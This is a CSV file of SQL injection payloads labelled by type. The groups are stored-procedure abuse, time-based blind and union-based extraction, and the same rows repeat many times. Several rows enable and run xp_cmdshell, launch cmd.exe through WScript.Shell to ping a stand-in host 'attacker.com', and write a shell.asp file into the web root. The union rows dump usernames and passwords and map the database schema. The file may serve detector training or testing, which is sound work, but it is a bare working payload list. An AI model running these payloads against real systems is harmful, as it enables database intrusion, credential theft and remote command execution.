Payload,Tipo
"'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",Stored_Procedure
'; EXEC sp_MSgetversion--,Stored_Procedure
'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,Stored_Procedure
'; EXEC xp_cmdshell('whoami')--,Stored_Procedure
"'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",Stored_Procedure
'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,Stored_Procedure
"'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",Stored_Procedure
"'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",Stored_Procedure
'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,Stored_Procedure
'; EXEC sp_who--,Stored_Procedure
'; EXEC sp_helpdb--,Stored_Procedure
'; EXEC sp_configure--,Stored_Procedure
"'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",Stored_Procedure
'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,Stored_Procedure
"'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",Stored_Procedure
"'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",Stored_Procedure
'; EXEC sp_MSgetversion--,Stored_Procedure
'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,Stored_Procedure
'; EXEC xp_cmdshell('whoami')--,Stored_Procedure
"'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",Stored_Procedure
'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,Stored_Procedure
"'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",Stored_Procedure
"'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",Stored_Procedure
'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,Stored_Procedure
'; EXEC sp_who--,Stored_Procedure
'; EXEC sp_helpdb--,Stored_Procedure
'; EXEC sp_configure--,Stored_Procedure
"'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",Stored_Procedure
'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,Stored_Procedure
"'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",Stored_Procedure
"'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",Stored_Procedure
'; EXEC sp_MSgetversion--,Stored_Procedure
'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,Stored_Procedure
'; EXEC xp_cmdshell('whoami')--,Stored_Procedure
"'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell('whoami')--",Stored_Procedure
'; EXEC master.dbo.xp_cmdshell 'ping attacker.com'--,Stored_Procedure
"'; EXEC sp_makewebtask 'C:\inetpub\wwwroot\shell.asp', 'SELECT * FROM users'--",Stored_Procedure
"'; EXEC sp_OACreate 'Scripting.FileSystemObject', @fs OUTPUT; EXEC sp_OAMethod @fs, 'CreateTextFile', @file OUTPUT, 'C:\inetpub\wwwroot\shell.asp', TRUE;--",Stored_Procedure
'; EXEC sp_executesql N'SELECT * FROM users WHERE id = 1'--,Stored_Procedure
'; EXEC sp_who--,Stored_Procedure
'; EXEC sp_helpdb--,Stored_Procedure
'; EXEC sp_configure--,Stored_Procedure
"'; EXEC master..xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Windows NT\CurrentVersion', 'ProductName'--",Stored_Procedure
'; EXEC sp_MSForEachDB 'SELECT name FROM sys.databases'--,Stored_Procedure
"'; EXEC master..xp_servicecontrol 'QUERYSTATE', 'MSSQLSERVER'--",Stored_Procedure
"'; EXEC sp_OACreate 'WScript.Shell', @o OUTPUT; EXEC sp_OAMethod @o, 'Run', Null, 'cmd.exe /c ping attacker.com';--",Stored_Procedure
'; EXEC sp_MSgetversion--,Stored_Procedure
'; EXEC sp_MSforeachtable 'SELECT * FROM ?'--,Stored_Procedure
' AND SLEEP(5)--,Time_Based
' OR SLEEP(5)--,Time_Based
'; WAITFOR DELAY '0:0:5'--,Time_Based
"' AND IF(1=1, SLEEP(5), 0)--",Time_Based
"' AND IF(1=2, SLEEP(5), 0)--",Time_Based
"' OR IF(1=1, SLEEP(5), 0)--",Time_Based
"' OR IF(1=2, SLEEP(5), 0)--",Time_Based
"' AND BENCHMARK(5000000,MD5('test'))--",Time_Based
"' OR BENCHMARK(5000000,MD5('test'))--",Time_Based
' AND pg_sleep(5)--,Time_Based
'; SELECT pg_sleep(5)--,Time_Based
'; WAITFOR DELAY '00:00:05'--,Time_Based
"' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--",Time_Based
"' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--",Time_Based
"' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Time_Based
' AND SLEEP(5)--,Time_Based
' OR SLEEP(5)--,Time_Based
'; WAITFOR DELAY '0:0:5'--,Time_Based
"' AND IF(1=1, SLEEP(5), 0)--",Time_Based
"' AND IF(1=2, SLEEP(5), 0)--",Time_Based
"' OR IF(1=1, SLEEP(5), 0)--",Time_Based
"' OR IF(1=2, SLEEP(5), 0)--",Time_Based
"' AND BENCHMARK(5000000,MD5('test'))--",Time_Based
"' OR BENCHMARK(5000000,MD5('test'))--",Time_Based
' AND pg_sleep(5)--,Time_Based
'; SELECT pg_sleep(5)--,Time_Based
'; WAITFOR DELAY '00:00:05'--,Time_Based
"' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--",Time_Based
"' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--",Time_Based
"' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Time_Based
' AND SLEEP(5)--,Time_Based
' OR SLEEP(5)--,Time_Based
'; WAITFOR DELAY '0:0:5'--,Time_Based
"' AND IF(1=1, SLEEP(5), 0)--",Time_Based
"' AND IF(1=2, SLEEP(5), 0)--",Time_Based
"' OR IF(1=1, SLEEP(5), 0)--",Time_Based
"' OR IF(1=2, SLEEP(5), 0)--",Time_Based
"' AND BENCHMARK(5000000,MD5('test'))--",Time_Based
"' OR BENCHMARK(5000000,MD5('test'))--",Time_Based
' AND pg_sleep(5)--,Time_Based
'; SELECT pg_sleep(5)--,Time_Based
'; WAITFOR DELAY '00:00:05'--,Time_Based
"' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--",Time_Based
"' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--",Time_Based
"' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Time_Based
' AND SLEEP(5)--,Time_Based
' OR SLEEP(5)--,Time_Based
'; WAITFOR DELAY '0:0:5'--,Time_Based
"' AND IF(1=1, SLEEP(5), 0)--",Time_Based
"' AND IF(1=2, SLEEP(5), 0)--",Time_Based
"' OR IF(1=1, SLEEP(5), 0)--",Time_Based
"' OR IF(1=2, SLEEP(5), 0)--",Time_Based
"' AND BENCHMARK(5000000,MD5('test'))--",Time_Based
"' OR BENCHMARK(5000000,MD5('test'))--",Time_Based
' AND pg_sleep(5)--,Time_Based
'; SELECT pg_sleep(5)--,Time_Based
'; WAITFOR DELAY '00:00:05'--,Time_Based
"' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--",Time_Based
"' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--",Time_Based
"' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Time_Based
' AND SLEEP(5)--,Time_Based
' OR SLEEP(5)--,Time_Based
'; WAITFOR DELAY '0:0:5'--,Time_Based
"' AND IF(1=1, SLEEP(5), 0)--",Time_Based
"' AND IF(1=2, SLEEP(5), 0)--",Time_Based
"' OR IF(1=1, SLEEP(5), 0)--",Time_Based
"' OR IF(1=2, SLEEP(5), 0)--",Time_Based
"' AND BENCHMARK(5000000,MD5('test'))--",Time_Based
"' OR BENCHMARK(5000000,MD5('test'))--",Time_Based
' AND pg_sleep(5)--,Time_Based
'; SELECT pg_sleep(5)--,Time_Based
'; WAITFOR DELAY '00:00:05'--,Time_Based
"' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--",Time_Based
"' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--",Time_Based
"' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Time_Based
' AND SLEEP(5)--,Time_Based
' OR SLEEP(5)--,Time_Based
'; WAITFOR DELAY '0:0:5'--,Time_Based
"' AND IF(1=1, SLEEP(5), 0)--",Time_Based
"' AND IF(1=2, SLEEP(5), 0)--",Time_Based
"' OR IF(1=1, SLEEP(5), 0)--",Time_Based
"' OR IF(1=2, SLEEP(5), 0)--",Time_Based
"' AND BENCHMARK(5000000,MD5('test'))--",Time_Based
"' OR BENCHMARK(5000000,MD5('test'))--",Time_Based
' AND pg_sleep(5)--,Time_Based
'; SELECT pg_sleep(5)--,Time_Based
'; WAITFOR DELAY '00:00:05'--,Time_Based
"' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--",Time_Based
"' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--",Time_Based
"' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Time_Based
' AND SLEEP(5)--,Time_Based
' OR SLEEP(5)--,Time_Based
'; WAITFOR DELAY '0:0:5'--,Time_Based
"' AND IF(1=1, SLEEP(5), 0)--",Time_Based
"' AND IF(1=2, SLEEP(5), 0)--",Time_Based
"' OR IF(1=1, SLEEP(5), 0)--",Time_Based
"' OR IF(1=2, SLEEP(5), 0)--",Time_Based
"' AND BENCHMARK(5000000,MD5('test'))--",Time_Based
"' OR BENCHMARK(5000000,MD5('test'))--",Time_Based
' AND pg_sleep(5)--,Time_Based
'; SELECT pg_sleep(5)--,Time_Based
'; WAITFOR DELAY '00:00:05'--,Time_Based
"' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--",Time_Based
"' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--",Time_Based
"' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Time_Based
' AND SLEEP(5)--,Time_Based
' OR SLEEP(5)--,Time_Based
'; WAITFOR DELAY '0:0:5'--,Time_Based
"' AND IF(1=1, SLEEP(5), 0)--",Time_Based
"' AND IF(1=2, SLEEP(5), 0)--",Time_Based
"' OR IF(1=1, SLEEP(5), 0)--",Time_Based
"' OR IF(1=2, SLEEP(5), 0)--",Time_Based
"' AND BENCHMARK(5000000,MD5('test'))--",Time_Based
"' OR BENCHMARK(5000000,MD5('test'))--",Time_Based
' AND pg_sleep(5)--,Time_Based
'; SELECT pg_sleep(5)--,Time_Based
'; WAITFOR DELAY '00:00:05'--,Time_Based
"' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--",Time_Based
"' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--",Time_Based
"' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Time_Based
' AND SLEEP(5)--,Time_Based
' OR SLEEP(5)--,Time_Based
'; WAITFOR DELAY '0:0:5'--,Time_Based
"' AND IF(1=1, SLEEP(5), 0)--",Time_Based
"' AND IF(1=2, SLEEP(5), 0)--",Time_Based
"' OR IF(1=1, SLEEP(5), 0)--",Time_Based
"' OR IF(1=2, SLEEP(5), 0)--",Time_Based
"' AND BENCHMARK(5000000,MD5('test'))--",Time_Based
"' OR BENCHMARK(5000000,MD5('test'))--",Time_Based
' AND pg_sleep(5)--,Time_Based
'; SELECT pg_sleep(5)--,Time_Based
'; WAITFOR DELAY '00:00:05'--,Time_Based
"' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--",Time_Based
"' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--",Time_Based
"' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Time_Based
' AND SLEEP(5)--,Time_Based
' OR SLEEP(5)--,Time_Based
'; WAITFOR DELAY '0:0:5'--,Time_Based
"' AND IF(1=1, SLEEP(5), 0)--",Time_Based
"' AND IF(1=2, SLEEP(5), 0)--",Time_Based
"' OR IF(1=1, SLEEP(5), 0)--",Time_Based
"' OR IF(1=2, SLEEP(5), 0)--",Time_Based
"' AND BENCHMARK(5000000,MD5('test'))--",Time_Based
"' OR BENCHMARK(5000000,MD5('test'))--",Time_Based
' AND pg_sleep(5)--,Time_Based
'; SELECT pg_sleep(5)--,Time_Based
'; WAITFOR DELAY '00:00:05'--,Time_Based
"' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--",Time_Based
"' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--",Time_Based
"' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Time_Based
' AND SLEEP(5)--,Time_Based
' OR SLEEP(5)--,Time_Based
'; WAITFOR DELAY '0:0:5'--,Time_Based
"' AND IF(1=1, SLEEP(5), 0)--",Time_Based
"' AND IF(1=2, SLEEP(5), 0)--",Time_Based
"' OR IF(1=1, SLEEP(5), 0)--",Time_Based
"' OR IF(1=2, SLEEP(5), 0)--",Time_Based
"' AND BENCHMARK(5000000,MD5('test'))--",Time_Based
"' OR BENCHMARK(5000000,MD5('test'))--",Time_Based
' AND pg_sleep(5)--,Time_Based
'; SELECT pg_sleep(5)--,Time_Based
'; WAITFOR DELAY '00:00:05'--,Time_Based
"' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--",Time_Based
"' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--",Time_Based
"' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Time_Based
' AND SLEEP(5)--,Time_Based
' OR SLEEP(5)--,Time_Based
'; WAITFOR DELAY '0:0:5'--,Time_Based
"' AND IF(1=1, SLEEP(5), 0)--",Time_Based
"' AND IF(1=2, SLEEP(5), 0)--",Time_Based
"' OR IF(1=1, SLEEP(5), 0)--",Time_Based
"' OR IF(1=2, SLEEP(5), 0)--",Time_Based
"' AND BENCHMARK(5000000,MD5('test'))--",Time_Based
"' OR BENCHMARK(5000000,MD5('test'))--",Time_Based
' AND pg_sleep(5)--,Time_Based
'; SELECT pg_sleep(5)--,Time_Based
'; WAITFOR DELAY '00:00:05'--,Time_Based
"' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--",Time_Based
"' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--",Time_Based
"' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Time_Based
' AND SLEEP(5)--,Time_Based
' OR SLEEP(5)--,Time_Based
'; WAITFOR DELAY '0:0:5'--,Time_Based
"' AND IF(1=1, SLEEP(5), 0)--",Time_Based
"' AND IF(1=2, SLEEP(5), 0)--",Time_Based
"' OR IF(1=1, SLEEP(5), 0)--",Time_Based
"' OR IF(1=2, SLEEP(5), 0)--",Time_Based
"' AND BENCHMARK(5000000,MD5('test'))--",Time_Based
"' OR BENCHMARK(5000000,MD5('test'))--",Time_Based
' AND pg_sleep(5)--,Time_Based
'; SELECT pg_sleep(5)--,Time_Based
'; WAITFOR DELAY '00:00:05'--,Time_Based
"' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--",Time_Based
"' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--",Time_Based
"' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Time_Based
' AND SLEEP(5)--,Time_Based
' OR SLEEP(5)--,Time_Based
'; WAITFOR DELAY '0:0:5'--,Time_Based
"' AND IF(1=1, SLEEP(5), 0)--",Time_Based
"' AND IF(1=2, SLEEP(5), 0)--",Time_Based
"' OR IF(1=1, SLEEP(5), 0)--",Time_Based
"' OR IF(1=2, SLEEP(5), 0)--",Time_Based
"' AND BENCHMARK(5000000,MD5('test'))--",Time_Based
"' OR BENCHMARK(5000000,MD5('test'))--",Time_Based
' AND pg_sleep(5)--,Time_Based
'; SELECT pg_sleep(5)--,Time_Based
'; WAITFOR DELAY '00:00:05'--,Time_Based
"' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--",Time_Based
"' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--",Time_Based
"' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Time_Based
' AND SLEEP(5)--,Time_Based
' OR SLEEP(5)--,Time_Based
'; WAITFOR DELAY '0:0:5'--,Time_Based
"' AND IF(1=1, SLEEP(5), 0)--",Time_Based
"' AND IF(1=2, SLEEP(5), 0)--",Time_Based
"' OR IF(1=1, SLEEP(5), 0)--",Time_Based
"' OR IF(1=2, SLEEP(5), 0)--",Time_Based
"' AND BENCHMARK(5000000,MD5('test'))--",Time_Based
"' OR BENCHMARK(5000000,MD5('test'))--",Time_Based
' AND pg_sleep(5)--,Time_Based
'; SELECT pg_sleep(5)--,Time_Based
'; WAITFOR DELAY '00:00:05'--,Time_Based
"' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--",Time_Based
"' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--",Time_Based
"' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Time_Based
' AND SLEEP(5)--,Time_Based
' OR SLEEP(5)--,Time_Based
'; WAITFOR DELAY '0:0:5'--,Time_Based
"' AND IF(1=1, SLEEP(5), 0)--",Time_Based
"' AND IF(1=2, SLEEP(5), 0)--",Time_Based
"' OR IF(1=1, SLEEP(5), 0)--",Time_Based
"' OR IF(1=2, SLEEP(5), 0)--",Time_Based
"' AND BENCHMARK(5000000,MD5('test'))--",Time_Based
"' OR BENCHMARK(5000000,MD5('test'))--",Time_Based
' AND pg_sleep(5)--,Time_Based
'; SELECT pg_sleep(5)--,Time_Based
'; WAITFOR DELAY '00:00:05'--,Time_Based
"' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--",Time_Based
"' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--",Time_Based
"' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Time_Based
' AND SLEEP(5)--,Time_Based
' OR SLEEP(5)--,Time_Based
'; WAITFOR DELAY '0:0:5'--,Time_Based
"' AND IF(1=1, SLEEP(5), 0)--",Time_Based
"' AND IF(1=2, SLEEP(5), 0)--",Time_Based
"' OR IF(1=1, SLEEP(5), 0)--",Time_Based
"' OR IF(1=2, SLEEP(5), 0)--",Time_Based
"' AND BENCHMARK(5000000,MD5('test'))--",Time_Based
"' OR BENCHMARK(5000000,MD5('test'))--",Time_Based
' AND pg_sleep(5)--,Time_Based
'; SELECT pg_sleep(5)--,Time_Based
'; WAITFOR DELAY '00:00:05'--,Time_Based
"' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--",Time_Based
"' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--",Time_Based
"' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Time_Based
' AND SLEEP(5)--,Time_Based
' OR SLEEP(5)--,Time_Based
'; WAITFOR DELAY '0:0:5'--,Time_Based
"' AND IF(1=1, SLEEP(5), 0)--",Time_Based
"' AND IF(1=2, SLEEP(5), 0)--",Time_Based
"' OR IF(1=1, SLEEP(5), 0)--",Time_Based
"' OR IF(1=2, SLEEP(5), 0)--",Time_Based
"' AND BENCHMARK(5000000,MD5('test'))--",Time_Based
"' OR BENCHMARK(5000000,MD5('test'))--",Time_Based
' AND pg_sleep(5)--,Time_Based
'; SELECT pg_sleep(5)--,Time_Based
'; WAITFOR DELAY '00:00:05'--,Time_Based
"' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--",Time_Based
"' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--",Time_Based
"' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Time_Based
' AND SLEEP(5)--,Time_Based
' OR SLEEP(5)--,Time_Based
'; WAITFOR DELAY '0:0:5'--,Time_Based
"' AND IF(1=1, SLEEP(5), 0)--",Time_Based
"' AND IF(1=2, SLEEP(5), 0)--",Time_Based
"' OR IF(1=1, SLEEP(5), 0)--",Time_Based
"' OR IF(1=2, SLEEP(5), 0)--",Time_Based
"' AND BENCHMARK(5000000,MD5('test'))--",Time_Based
"' OR BENCHMARK(5000000,MD5('test'))--",Time_Based
' AND pg_sleep(5)--,Time_Based
'; SELECT pg_sleep(5)--,Time_Based
'; WAITFOR DELAY '00:00:05'--,Time_Based
"' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--",Time_Based
"' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--",Time_Based
"' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Time_Based
' AND SLEEP(5)--,Time_Based
' OR SLEEP(5)--,Time_Based
'; WAITFOR DELAY '0:0:5'--,Time_Based
"' AND IF(1=1, SLEEP(5), 0)--",Time_Based
"' AND IF(1=2, SLEEP(5), 0)--",Time_Based
"' OR IF(1=1, SLEEP(5), 0)--",Time_Based
"' OR IF(1=2, SLEEP(5), 0)--",Time_Based
"' AND BENCHMARK(5000000,MD5('test'))--",Time_Based
"' OR BENCHMARK(5000000,MD5('test'))--",Time_Based
' AND pg_sleep(5)--,Time_Based
'; SELECT pg_sleep(5)--,Time_Based
'; WAITFOR DELAY '00:00:05'--,Time_Based
"' AND IF(LENGTH(DATABASE())>5, SLEEP(5), 0)--",Time_Based
"' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>64, SLEEP(5), 0)--",Time_Based
"' AND IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",Time_Based
"' UNION SELECT null, null--",Union_Based
"' UNION SELECT username, password FROM users--",Union_Based
"' UNION SELECT 1,2,3--",Union_Based
"' UNION SELECT database(), version()--",Union_Based
"' UNION SELECT 1, database()--",Union_Based
"' UNION SELECT user(), version()--",Union_Based
"' UNION SELECT null, table_name FROM information_schema.tables--",Union_Based
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--,Union_Based
"' UNION SELECT username, password FROM members--",Union_Based
"' UNION SELECT null, null, null--",Union_Based
"' UNION SELECT 1,2,3 FROM dual--",Union_Based
"' UNION ALL SELECT null, username, password FROM admin--",Union_Based
"' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",Union_Based
"' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--",Union_Based
"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--",Union_Based
"' UNION SELECT 1,2,3 WHERE 1=1--",Union_Based
"' UNION SELECT null, null--",Union_Based
"' UNION SELECT username, password FROM users--",Union_Based
"' UNION SELECT 1,2,3--",Union_Based
"' UNION SELECT database(), version()--",Union_Based
"' UNION SELECT 1, database()--",Union_Based
"' UNION SELECT user(), version()--",Union_Based
"' UNION SELECT null, table_name FROM information_schema.tables--",Union_Based
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--,Union_Based
"' UNION SELECT username, password FROM members--",Union_Based
"' UNION SELECT null, null, null--",Union_Based
"' UNION SELECT 1,2,3 FROM dual--",Union_Based
"' UNION ALL SELECT null, username, password FROM admin--",Union_Based
"' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",Union_Based
"' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--",Union_Based
"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--",Union_Based
"' UNION SELECT 1,2,3 WHERE 1=1--",Union_Based
"' UNION SELECT null, null--",Union_Based
"' UNION SELECT username, password FROM users--",Union_Based
"' UNION SELECT 1,2,3--",Union_Based
"' UNION SELECT database(), version()--",Union_Based
"' UNION SELECT 1, database()--",Union_Based
"' UNION SELECT user(), version()--",Union_Based
"' UNION SELECT null, table_name FROM information_schema.tables--",Union_Based
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--,Union_Based
"' UNION SELECT username, password FROM members--",Union_Based
"' UNION SELECT null, null, null--",Union_Based
"' UNION SELECT 1,2,3 FROM dual--",Union_Based
"' UNION ALL SELECT null, username, password FROM admin--",Union_Based
"' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",Union_Based
"' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--",Union_Based
"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--",Union_Based
"' UNION SELECT 1,2,3 WHERE 1=1--",Union_Based
"' UNION SELECT null, null--",Union_Based
"' UNION SELECT username, password FROM users--",Union_Based
"' UNION SELECT 1,2,3--",Union_Based
"' UNION SELECT database(), version()--",Union_Based
"' UNION SELECT 1, database()--",Union_Based
"' UNION SELECT user(), version()--",Union_Based
"' UNION SELECT null, table_name FROM information_schema.tables--",Union_Based
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--,Union_Based
"' UNION SELECT username, password FROM members--",Union_Based
"' UNION SELECT null, null, null--",Union_Based
"' UNION SELECT 1,2,3 FROM dual--",Union_Based
"' UNION ALL SELECT null, username, password FROM admin--",Union_Based
"' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables--",Union_Based
"' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--",Union_Based
"' UNION SELECT null, null, table_name FROM information_schema.tables WHERE table_schema=database()--",Union_Based
"' UNION SELECT 1,2,3 WHERE 1=1--",Union_Based
"' UNION SELECT null, null--",Union_Based
"' UNION SELECT username, password FROM users--",Union_Based
"' UNION SELECT 1,2,3--",Union_Based
"' UNION SELECT database(), version()--",Union_Based
"' UNION SELECT 1, database()--",Union_Based
"' UNION SELECT user(), version()--",Union_Based
"' UNION SELECT null, table_name FROM information_schema.tables--",Union_Based
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--,Union_Based
"' UNION SELECT username, password FROM members--",Union_Based
"' UNION SELECT null, null, null--",Union_Based
"' UNION SELECT 1,2,3 FROM dual--",Union_Based
"' UNION ALL SELECT null, username, password FROM admin--",Union_Based
